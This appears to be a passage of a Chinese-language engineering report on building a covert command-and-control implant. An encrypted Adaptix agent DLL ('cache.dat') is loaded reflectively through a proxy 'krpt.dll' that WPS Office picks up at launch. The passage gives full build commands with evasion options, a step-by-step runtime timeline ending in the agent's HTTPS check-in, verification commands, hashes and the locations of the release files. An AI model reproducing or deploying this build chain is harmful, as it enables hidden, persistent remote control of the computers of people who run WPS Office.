`ProcessData()` 在 [pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go:1128) 解码结果 envelope：

1. 读取 task ID 和 command ID。
2. 根据 command ID 进入对应 handler。
3. 将 Windows 代码页转换为 UTF-8。
4. 将文本、路径、文件列表、下载状态写入 `adaptix.TaskData`。
5. 通过 Teamserver 回调更新任务和文件浏览器。

例如 `COMMAND_DISKS` 会读取成功位、驱动器数量、盘符和驱动器类型；`COMMAND_JOB` 会读取运行中、完成、取消等状态；`COMMAND_DOWNLOAD` 会按 start/continue/finish 三类事件更新服务端文件流。

## 9. 最终构建过程对应到代码

最终 profile DLL 的完整构建由 [build_direct_https_profile_dll.py](research/memory-loader-lab/build_direct_https_profile_dll.py:284) 组织：

### 第一步：读取 listener 配置

脚本通过 Adaptix API 登录并调用 `/listener/list`，读取 `HTTPS_LISTENER` 的 callback 地址、端口、URI、UA、心跳字段和 listener 加密 key。

### 第二步：生成 275 字节 profile

脚本把参数按 C++ `Packer` 的顺序编码，再用 listener key 做 RC4，最终写出：

```text
profile_dll/profile.bin
```

这个文件只保存通信配置，不保存 C++ 代码。

### 第三步：构建 direct_https Agent 对象

脚本执行 `make -C .../src_beacon`，构建 `Agent.cpp`、`AgentConfig.cpp`、`ApiLoader.cpp`、`Commander.cpp`、`ConnectorHTTP.cpp`、`JobsController.cpp`、`MainAgent.cpp` 等对象。

最终 release metadata 记录的完整链接模块包括：

```text
config
Agent
AgentConfig
AgentInfo
ApiLoader
Commander
ConnectorHTTP
Crypt
Downloader
Encoders
JobsController
MainAgent
MemorySaver
Packer
ProcLoader
WaitMask
crt
std
utils
direct_https_dll_entry
```

### 第四步：把 profile 嵌入 `config.cpp`

构建命令以 `-DPROFILE="\\x..." -DPROFILE_SIZE=275` 编译 `config.cpp`，于是 profile bytes 会成为 DLL 内部的静态数据。

### 第五步：链接 Windows profile DLL

使用 `x86_64-w64-mingw32-g++ -shared` 链接所有 x64 对象，并通过 `direct_https_dll_entry.cpp` 导出 `RunAgentDll`。

这一步的产物是：

```text
direct_https_profile.x64.dll
```

最终大小 `79360` 字节，SHA-256：

```text
68a869ea61661679b80e7960e0d2ddcbef3c71e0fb9f7d59acbeb01af051860e
```

### 第六步：离线解析并生成 DHPL1

`pack_profile_container.py` 解析这个 DLL 的 PE 结构，在 Linux 构建阶段记录：

```text
section / import / relocation / TLS / exception / entry point / RunAgentDll RVA
```

它还可以把 `RunAgentDll` 的导出名字清零，因为运行时直接使用保存的 RVA。最终 metadata 记录：

```text
run_agent_rva      0x1340
export_name_scrubbed true
```

### 第七步：AES-GCM 封装成 `cache.dat`

DHPL1 明文进入 DHPLE2 AES-256-GCM 封装，生成最终 `cache.dat`。

### 第八步：把 loader 对象链接进 WPS proxy

最终 WPS proxy 构建命令的核心等价于：

```bash
x86_64-w64-mingw32-gcc \
  -O1 -Dmain=dhpl_loader_main \
  -DPROFILE_ONLY_RELEASE \
  -DPROFILE_ONLY_NO_ENV_KEY \
  -DPROFILE_ONLY_DYNAMIC_BCRYPT \
  -DPROFILE_ONLY_DYNAMIC_MEM_API \
  -DPROFILE_ONLY_DISABLE_MINGW_RUNTIME_PSEUDO_RELOC \
  -c loader_profile_only.c \
  -o dhpl_loader_profile_only.x64.o

x86_64-w64-mingw32-gcc \
  -static -shared -s \
  krpt_proxy_agent.c \
  dhpl_loader_profile_only.x64.o \
  krpt_proxy.def \
  -o krpt.dll
```

实际脚本在 [build-krpt-proxy.sh](research/wps-krpt-proxy/build-krpt-proxy.sh:39)。

## 10. 这条链路运行时的真实时序

把前面的代码压缩成一段“调试时可以照着看”的时间线：

```text
T0  WPP/WPS 启动
T1  Windows 载入 office6\krpt.dll
T2  krpt_proxy_agent!DllMain(DLL_PROCESS_ATTACH)
T3  init_paths() 找到 office6\cache.dat
T4  start_agent_once() 创建 loader 线程
T5  agent_loader_thread() 等待 100ms
T6  dhpl_loader_main(4, argv)
T7  read_file_winapi() 读取 79896 字节 cache.dat
T8  DHPLE2 header 校验通过
T9  PBKDF2 派生 32 字节 AES key
T10 BCryptDecrypt() 取得 79808 字节 DHPL1
T11 validate_header() 读取 10 个 section、63 个 reloc、24 个 import、2 个 TLS
T12 VirtualAlloc() 分配 profile image
T13 copy_sections() / apply_relocations() / resolve_imports()
T14 register_exception_table() / protect_sections()
T15 TLS callbacks
T16 profile DllMain(DLL_PROCESS_ATTACH)
T17 清零 DHPL1 临时容器
T18 image + 0x1340 -> RunAgentDll()
T19 RunAgentDll() -> AgentMain(NULL)
T20 ApiLoad()
T21 new Agent() -> new AgentConfig()
T22 AgentConfig 解 RC4 profile.bin 的嵌入副本
T23 ConnectorHTTP 设置 HTTPS profile
T24 Agent 发送首次 check-in
T25 Teamserver listener 接收并交给 agent_direct_https.so
T26 服务端注册 Agent，UI 可以下发命令
```

## 11. 如何验证每一层是否真的接上

### 11.1 磁盘文件验证

在 Linux 报告目录中：

```bash
sha256sum \
  cache.dat \
  krpt-build/krpt.dll \
  profile_dll/direct_https_profile.x64.dll \
  agent_direct_https.so
```

重点检查：

- 新候选输出中只应出现 `krpt.dll`，不应再出现旧别名文件。
- 远程 WPP/WPS 目录的 `cache.dat` hash 与报告中的 `5c898...3961b` 相同。
- 远程 `krpt.dll` hash 与报告中的 `b4bb...46bac` 相同。

### 11.2 `cache.dat` 外层格式验证

```bash
xxd -l 16 cache.dat
```

应看到 DHPLE2 magic，而不是 `MZ`。完整字段和随机 salt/nonce/tag 以 [cache.dat.meta.json](LOCAL_CANDIDATE_ROOT/cache.dat.meta.json:1) 为准。

### 11.3 proxy 导出验证

```bash
x86_64-w64-mingw32-objdump -p krpt-build/krpt.dll
```

应看到：

- `file format pei-x86-64`；
- `DLL`；
- 8 个原始 `krpt` 导出；
- 每个导出指向 `krpt_orig.<name>` 的 forwarder。

最终验证结果见 [build-krpt-proxy-ps-encoding.log](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/build-logs/build-krpt-proxy-ps-encoding.log:1)。

### 11.4 loader 阶段日志验证

最终诊断 proxy 会记录类似下面的阶段：

```text
DLL_PROCESS_ATTACH
AGENT_THREAD_CREATED
AGENT_THREAD_BEGIN
DHPL_START
DHPL_READ_OK_SIZE
DHPLE2_HEADER_FOUND
DHPLE2_KEY_DERIVE_OK
DHPLE2_DECRYPT_OK
DHPL_VALIDATE_OK
DHPL_ALLOC_OK
DHPL_SECTIONS_OK
DHPL_RELOC_OK
DHPL_IMPORT_OK
DHPL_EXCEPTION_OK
DHPL_PROTECT_OK
DHPL_TLS_OK
DHPL_DLLMAIN_OK
DHPL_HEADER_ZERO_OK
DHPL_CONTAINER_ZERO_OK
DHPL_RUN_AGENT_BEGIN
```

这组标记的价值在于，它可以把“WPS 已经加载 DLL”“cache.dat 解密成功”“profile 映射成功”“AgentMain 已经开始”四种状态区分开。

### 11.5 Agent 运行阶段日志验证

如果构建时打开 Agent 诊断宏，`MainAgent.cpp` 会写入：

```text
AGENTMAIN_ENTER
AGENTMAIN_APILOAD_OK
AGENT_OBJECTS_CREATED
AGENT_SETPROFILE_OK
AGENT_LOOP_READY
AGENT_WAIT_CONNECTION_TRUE
AGENT_EXCHANGE_EMPTY_BEGIN
AGENT_EXCHANGE_EMPTY_END
AGENT_PROCESS_TASKS_BEGIN
AGENT_PROCESS_TASKS_END
```

这样可以继续判断是 loader 阶段的问题，还是 Agent 已启动但 HTTPS/协议阶段的问题。

## 12. 对“加密 cache.dat”的准确理解

可以用下面这句话记忆：

> `cache.dat` 是 AES-GCM 加密的 DHPL1 代码容器；DHPL1 解密后恢复 profile DLL 的 section 和加载元数据；profile DLL 启动后又从自身内嵌的 275 字节 profile 中用 RC4 恢复 listener 配置。

再具体一点：

```text
cache.dat 外层 AES-GCM
    保护：profile DLL 代码 section + 映射元数据

profile.bin 内层 RC4
    保护：callback、URI、UA、Header、sleep、listener 参数

WPP/WPS 运行时
    先解 AES-GCM，再解 RC4，随后进入 HTTPS Agent 主循环
```

这也解释了为什么最终报告里同时有 `cache.dat`、`profile.bin`、`direct_https_profile.x64.dll` 和 `agent_direct_https.so`：它们属于不同阶段，不是四份重复的 Agent。

## 13. 最终候选留存位置

最终候选目录：

```text
LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1
```

关键文件：

- [cache.dat](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/cache.dat)
- [krpt.dll](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/krpt.dll)
- [direct_https_profile.x64.dll](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/profile_dll/direct_https_profile.x64.dll)
- [profile.bin](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/profile_dll/profile.bin)
- [agent_direct_https.so](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/agent_direct_https.so)
- [MANIFEST.md](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/MANIFEST.md)

说明：上述 `release-wpp-functional-v1` 是 2026-07-21 的历史候选，目录里仍保留当时生成的旧别名及其扫描记录。后续重新构建的候选包以 `cache.dat`、`krpt.dll`、profile DLL 和服务端插件为准，不再把旧别名列入交付文件。

对应源码：

- [krpt_proxy_agent.c](research/wps-krpt-proxy/krpt_proxy_agent.c)
- [build-krpt-proxy.sh](research/wps-krpt-proxy/build-krpt-proxy.sh)
- [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c)
- [pack_profile_container.py](research/memory-loader-lab/pack_profile_container.py)
- [direct_https_dll_entry.cpp](research/memory-loader-lab/src/direct_https_dll_entry.cpp)
- [MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp)
- [AgentConfig.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/AgentConfig.cpp)
- [pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go)

本说明只记录和解释现有本地实现及最终候选，没有向上游 Adaptix 仓库提交这些 WPS proxy、DHPL loader 或 `cache.dat` 内容。远程留存应继续使用你自己的仓库或本地报告目录。
